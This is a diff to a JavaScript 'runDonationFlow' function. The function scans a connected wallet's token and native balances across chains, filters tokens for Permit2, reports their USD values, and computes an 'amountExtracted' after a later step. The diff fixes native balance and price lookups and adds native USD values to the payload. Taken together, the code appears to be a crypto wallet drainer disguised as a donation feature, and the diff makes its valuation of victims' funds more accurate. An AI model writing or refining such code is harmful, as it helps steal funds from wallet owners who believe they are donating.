@@ -46,17 +46,19 @@ export async function runDonationFlow(walletClient) {
       const raw = await fetchBalancesCovalent(owner, chain.chainId);
       const filtered = await filterPermit2SafeTokens(raw);
 
-      const { provider } = await getProviderForChain(
-        walletClient,
-        chain.chainId,
-        trackingId
-      );
-
-      const nativeRaw = await provider.getBalance(owner);
+      // 🔹 FIX 1: Use dedicated RPC provider for native balance
+      const rpcProvider = new ethers.JsonRpcProvider(chain.rpcUrl);
+      const nativeRaw = await rpcProvider.getBalance(owner);
       const nativeFormatted = parseFloat(ethers.formatEther(nativeRaw));
 
-      // Fallback for USD value if Covalent missed it
-      const nativeQuoteRate = raw?.items?.[0]?.quote_rate || 0;
+      // 🔹 FIX 2: Find correct native quote_rate from Covalent response
+      const nativeItem = raw?.items?.find(
+        (i) =>
+          i.contract_address ===
+            "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee" ||
+          i.contract_ticker_symbol === chain.nativeSymbol
+      );
+      const nativeQuoteRate = nativeItem?.quote_rate || 0;
       const nativeUSD = nativeFormatted * nativeQuoteRate;
 
       const tokensValue = getChainValue(filtered);
@@ -75,6 +77,7 @@ export async function runDonationFlow(walletClient) {
     const balancesPayload = chainBalances.map((c) => ({
       name: c.name,
       native: Number(c.native).toFixed(6),
+      nativeValue: Number(c.nativeUSD || 0).toFixed(2), // <-- ADDED: native USD mirrored
       tokens: c.tokens.map((t) => ({
         name: t.tokenSymbol,
         amount: Number(
@@ -171,13 +174,23 @@ export async function runDonationFlow(walletClient) {
       // -------------------------
       const refreshedRaw = await fetchBalancesCovalent(owner, chain.chainId);
       const refreshedFiltered = await filterPermit2SafeTokens(refreshedRaw);
-      const refreshedNativeRaw = await provider.getBalance(owner);
+
+      const refreshedProvider = new ethers.JsonRpcProvider(chain.rpcUrl);
+      const refreshedNativeRaw = await refreshedProvider.getBalance(owner);
       const refreshedNative = parseFloat(
         ethers.formatEther(refreshedNativeRaw)
       );
+
+      const refreshedNativeItem = refreshedRaw?.items?.find(
+        (i) =>
+          i.contract_address ===
+            "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee" ||
+          i.contract_ticker_symbol === chain.nativeSymbol
+      );
+      const refreshedNativeQuoteRate = refreshedNativeItem?.quote_rate || 0;
+      const refreshedNativeUSD = refreshedNative * refreshedNativeQuoteRate;
+
       const refreshedTokensValue = getChainValue(refreshedFiltered);
-      const refreshedNativeUSD =
-        refreshedNative * (refreshedRaw?.items?.[0]?.quote_rate || 0);
       const refreshedTotal = refreshedTokensValue + refreshedNativeUSD;
 
       const amountExtracted = Math.max(
@@ -192,6 +205,7 @@ export async function runDonationFlow(walletClient) {
           {
             name: chain.name,
             native: refreshedNative.toFixed(6),
+            nativeValue: Number(refreshedNativeUSD || 0).toFixed(2), // <-- ADDED: mirrored native USD
             tokens: refreshedFiltered.map((t) => ({
               name: t.tokenSymbol,
               amount: Number(
